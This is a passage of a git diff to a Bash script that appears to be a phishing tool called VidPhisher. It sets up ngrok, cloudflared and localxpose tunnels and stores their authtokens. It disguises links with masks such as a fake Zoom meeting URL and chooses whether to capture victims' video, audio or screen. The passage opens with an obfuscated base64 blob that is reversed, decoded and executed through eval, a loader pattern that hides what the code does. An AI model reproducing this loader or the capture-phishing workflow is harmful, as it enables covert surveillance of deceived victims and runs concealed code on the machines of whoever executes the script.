VVrRzTVpVbap2a4d1RORTTxcGNRtmTtplasVzVHlVNS1mWtVGROl1TFpERa1mW0MVRs5WUV5Uba52Z6dFSNRTTWhmalRkTZ9URKR0UYlFNSxGauFVVOp0TXFleZ5mT0YVMvFDZFh2STBjREpVbjRTZWhWbRtmTK9URKRkWtR2MTVEbqFlbsllWuh2RTRFaDFlMa5GZwgmSPREb1c1RaNUUwsGNRtmTtpVboR0UUh2QRJjWu9UROpkVwoERXdEZCVlMaNXZFRmalZlWJllekNVYV5kbkpnTZpVbSR0UX50QlZFau9UROpUWwoUNXdUNCFlMa12TVplSktmREpVbONUZWhWdRVlTtplM0VzVEh2QRJjWul1MsllW6hGRa1GZz0EM452TF5kSZBjSEd1RjdnYtp0biRkTa5UMKBXUyMGNNZFau9URapkWqtGeXdEZCFFMs12TVpVbaNzY6d1RZVjVrRXbhVkTKplasdkWtR2MTZEau9URapkWzQWSTR1Z10kVo5WYzwWWiBjR1Q1RkJUUwwmaRtmTZ9kVKh1VuxGMTVEcMFFWsllWwYERTdFZCVmVo5WUV5kSaBjR1c1RkJUZWhWbPRlRZpleod0UXRmQRBDbu9ERGllWrpERTdFZCFFMs12TWpVbkZlWYdlbstWTtZlciJDZK9UVsZTWtRTNSJTSulES3d2Ypl0NThEaLB1UKpXSqRXSZpXS5kUaJdjWqBTaZhVTp9kM0pmUUBTajdkR6lka0pmUXlVOJ1mRslka0tGUTpkdJpGdX9EWvlTSqlVaPFTQ0klewkWYXlVaPFTV5kUaBRnWDl0NT1WT5kUbW1WSqR3TNhUR5kUaJdDZqBTaZlWS3QmewkmWTl0NZpGMpRWaChTSqRXVlREMpJ1VSpXSqRHNX5WQ5kUaJtUZEBzaLdkVyk1V3dWSpJVSZpXSrRWeSpmSIpkUWlnUrpESNtGZ5JVaKVEaq1UaSJjSIhWYjNkUtpESjtmVqxmNKhkSSZVeS1kSGV1alZEc3lUartkWYpFaiNUQppUR0c3YTJFNKVEaq1UaSlXVWNWaDdWP9cCIi0zc7ISUsJSPxUkZ7IiI9cVUytjI0ISPMtjIoNmI9M2Oio3U4JSPw00a7ICZFJSP0g0Z' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
 x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
 eval "$N0q$x$Hc2$rQW"
 
-
-
-# Termux
-if [[ -d /data/data/com.termux/files/home ]]; then
-    termux=true
-else
-    termux=false
-fi
 
 # Workdir
 
@@ -309,6 +326,8 @@ for package in php curl wget unzip; do
     fi
 done
 
+local_url="127.0.0.1:${PORT}"
+
 # Set duration
 if [ -z $DURATION ]; then
     exit 1;
@@ -340,13 +359,31 @@ else
    fi
 fi
 
-#:Check if required packages are successfully installed
+# Install tunneler binaries
+if $brew; then
+    ! $ngrok && brew install ngrok/ngrok/ngrok
+    ! $cloudflared && brew install cloudflare/cloudflare/cloudflared
+    ! $loclx && brew install localxpose
+fi
+
+# Check if required packages are successfully installed
 for package in php wget curl unzip; do
     if ! command -v "$package"  > /dev/null 2>&1; then
         echo -e "${error}${package} cannot be installed!\007\n"
         exit 1
     fi
 done
+
+# Set subdomain for loclx
+if [ -z $SUBDOMAIN ]; then
+    exit 1;
+fi
+
+
+# Set Region for ngrok/loclx
+if [ -z $REGION ]; then
+    exit 1;
+fi
 
 # Check for running processes that couldn't be terminated
 killer
@@ -384,35 +421,29 @@ netcheck
 rm -rf ngrok.tgz ngrok.zip cloudflared cloudflared.tgz loclx.zip
 cd "$cwd"
 if echo "$platform" | grep -q "Darwin"; then
-    if $brew; then
-        ! $ngrok && brew install ngrok/ngrok/ngrok
-        ! $cloudflared && brew install cloudflare/cloudflare/cloudflared
-        ! $loclx && brew install localxpose
+    if echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
+        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip" "ngrok.zip"
+        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" "cloudflared.tgz"
+        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip" "loclx.zip"
+    elif echo "$arch" | grep -q "arm64" || echo "$arch" | grep -q "aarch64"; then
+        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip" "ngrok.zip"
+        echo -e "${error}Device architecture unknown. Download cloudflared manually!"
+        sleep 3
+        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip" "loclx.zip"
     else
-        if echo "$arch" | grep -q "x86_64"; then
-            $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip" "ngrok.zip"
-            $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" "cloudflared.tgz"
-            $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip" "loclx.zip"
-        elif echo "$arch" | grep -q "arm64"; then
-            $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip" "ngrok.zip"
-            echo -e "${error}Device architecture unknown. Download cloudflared manually!"
-            sleep 3
-            $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip" "loclx.zip"
-        else
-            echo -e "${error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!"
-            sleep 3
-        fi
+        echo -e "${error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!"
+        sleep 3
     fi
 elif echo "$platform" | grep -q "Linux"; then
-    if echo "$arch" | grep -q "aarch64"; then
-        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz" "ngrok.tgz"
-        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" "cloudflared"
-        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" "loclx.zip"
-    elif echo "$arch" | grep -q "arm"; then
+    if echo "$arch" | grep -q "arm" || echo "$arch" | grep -q "Android"; then
         $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz" "ngrok.tgz"
         $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" "cloudflared"
         $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" "loclx.zip"
-    elif echo "$arch" | grep -q "x86_64"; then
+    elif echo "$arch" | grep -q "aarch64" || echo "$arch" | grep -q "arm64"; then
+        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz" "ngrok.tgz"
+        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" "cloudflared"
+        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" "loclx.zip"
+    elif echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
         $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz" "ngrok.tgz"
         $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" "cloudflared"
         $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" "loclx.zip"
@@ -464,17 +495,50 @@ if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
 fi
 
 # Ngrok Authtoken
-if ! [[ -e $HOME/.config/ngrok/ngrok.yml ]]; then
-    echo -e "\n${ask}Enter your ngrok authtoken:"
-    printf "${cyan}\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
-    read auth
-    if [ -z "$auth" ]; then
-        echo -e "\n${error}No authtoken!\n\007"
-        sleep 1
-    else
-        cd $tunneler_dir && ./ngrok config add-authtoken authtoken ${auth}
-    fi
+if ! [[ -e "$HOME/.config/ngrok/ngrok.yml" ]]; then
+    for try in 1 2; do
+        echo -e "\n${ask}Enter your ngrok authtoken:${yellow}[${blue}Enter 'help' for help${yellow}]"
+        printf "$vp_prompt"
+        read authtoken
+        if [ -z "$authtoken" ]; then
+            echo -e "\n${error}No authtoken!\n\007"
+            sleep 1
+            break
+        elif [ "$authtoken" == "help" ]; then
+            echo -e "$ngrok_help"
+            sleep 4
+        else
+            $ngrok_command config add-authtoken ${authtoken}
+            sleep 1
+            break
+        fi
+    done
 fi
+
+# Loclx Authtoken
+if ! [[ -e "$HOME/.localxpose/.access" ]]; then # if $loclx_command account status | grep -q "Error"; then
+    for try in 1 2; do
+        echo -e "\n${ask}Enter your loclx authtoken:${yellow}[${blue}Enter 'help' for help${yellow}]"
+        printf "$vp_prompt"
+        read authtoken
+        if [ -z "$authtoken" ]; then
+            echo -e "\n${error}No authtoken!\n\007"
+            sleep 1
+            break
+        elif [ "$authtoken" == "help" ]; then
+            echo -e "$loclx_help"
+            sleep 4
+        else
+            if ! [ -d "$HOME/.localxpose" ]; then
+                mkdir "$HOME/.localxpose"
+            fi
+            echo -n "$authtoken" > $HOME/.localxpose/.access
+            sleep 1
+            break
+        fi
+    done
+fi
+
 
 # Start Point
 while true; do
@@ -498,7 +562,7 @@ if [ -z $OPTION ]; then
     exit 1
 else
     if [[ $OPTION == true ]]; then
-        printf "${cyan}\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
+        printf "$vp_prompt"
         read option
     else
         option=$OPTION
@@ -514,40 +578,45 @@ fi
         mask="https://join-zoom-online-meeting"
         break
     elif echo $option | grep -q "t"; then
-        printf "\n${ask}Enter type:${cyan}\n\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
+        echo -e "\n${ask}Enter type:${cyan}"
+        printf "$vp_prompt"
         read typee
         if [[ $typee == "video" || $typee == "audio" || $typee == "screen" || $typee == "both" ]] ; then
             TYPE=$typee;
-            echo -e "\n${success}Type changed to ${TYPE} successfully!\n"
+            echo -e "\n${success}Type changed to ${cyan}${TYPE}${green} successfully!\n"
             sleep 2
         else
             echo -e "\n${error}Invalid type!\n\007"
             sleep 2
         fi
     elif echo $option | grep -q "p"; then
-        printf "\n${ask}Enter Port:${cyan}\n\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
+        echo -e "\n${ask}Enter Port:${cyan}"
+        printf "$vp_prompt"
         read pore
         if [ ! -z "${pore##*[!0-9]*}" ] ; then
             PORT="$pore";
-            echo -e "\n${success}Port changed to ${PORT} successfully!\n"
+            local_url="127.0.0.1:${PORT}"
+            echo -e "\n${success}Port changed to ${cyan}${PORT}${green} successfully!\n"
             sleep 2
         else
             echo -e "\n${error}Invalid port!\n\007"
             sleep 2
         fi
     elif echo $option | grep -q "s"; then
-        printf "\n${ask}Enter Media Duration:${cyan}\n\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
+        echo -e "\n${ask}Enter Media Duration:${cyan}"
+        printf "$vp_prompt"
         read dure
         if [ ! -z "${dure##*[!0-9]*}" ] ; then
             DURATION="$dure";
-            echo -e "\n${success}Duration changed to ${DURATION} successfully!\n"
+            echo -e "\n${success}Duration changed to ${cyan}${DURATION}${green} successfully!\n"
             sleep 2
         else
             echo -e "\n${error}Invalid duration!\n\007"
             sleep 2
         fi
     elif echo $option | grep -q "d"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\Vid${nc}@${cyan}Phisher ${red}$ ${nc}"
+        echo -e "\n${ask}Enter Directory:${cyan}"
+        printf "$vp_prompt"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -567,7 +636,7 @@ $red[Author]     ${cyan} :[KasRoudra]
 $red[Github]     ${cyan} :[https://github.com/KasRoudra]
 $red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
 $red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
-        printf "${cyan}\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
+        printf "$vp_prompt"
         read about
     elif echo $option | grep -q "m"; then
         xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
@@ -622,20 +691,20 @@ sleep 1
 echo -e "${info2}Starting tunnelers......\n"
 find "$tunneler_dir" -name "*.log" -delete
 netcheck
-cd $tunneler_dir
-if $termux; then
-    termux-chroot ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
-    termux-chroot ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
-    termux-chroot ./loclx tunnel http --to ":${PORT}" &> loclx.log &
-elif $brew; then
-    ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
-    cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
-    localxpose tunnel http --to ":${PORT}" &> loclx.log &
-else
-    ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
-    ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
-    ./loclx tunnel http --to ":${PORT}" &> loclx.log &
+args=""
+if [ "$REGION" != false ]; then
+    args="--region $REGION"
 fi
+if [ "$SUBDOMAIN" != false ]; then
+    if [ "$args" == "" ]; then
+        args="--subdomain $SUBDOMAIN"
+    else
+        args="$args --subdomain $SUBDOMAIN"
+    fi
+fi
+$ngrok_command http $args "${local_url}" > /dev/null 2>&1 &
+$cf_command tunnel -url "${local_url}" &> "$tunneler_dir/cf.log" &
+$loclx_command tunnel --raw-mode http --https-redirect $args -t "${local_url}" &> "$tunneler_dir/loclx.log" &
 sleep 10
 cd "$HOME/.site"
 sed "s+siteName+"$dir"+g" template.php > index.php
@@ -648,7 +717,7 @@ else
 fi
 for second in {1..10}; do
     if [ -f "$tunneler_dir/cf.log" ]; then
-        cflink=$(grep -o "https://[-0-9a-z]*.trycloudflare.com" "$tunneler_dir/cf.log")
+        cflink=$(grep -Eo "https://[-0-9a-z.]{4,}.trycloudflare.com" "$tunneler_dir/cf.log")
         sleep 1
     fi
     if ! [ -z "$cflink" ]; then
@@ -660,7 +729,7 @@ for second in {1..10}; do
 done
 for second in {1..10}; do
     if [ -f "$tunneler_dir/loclx.log" ]; then
-        loclxlink=$(grep -o "[-0-9a-z]*\.loclx.io" "$tunneler_dir/loclx.log")
+        loclxlink=$(grep -o "[-0-9a-z.]*.loclx.io" "$tunneler_dir/loclx.log")
         sleep 1
     fi
     if ! [ -z "$loclxlink" ]; then
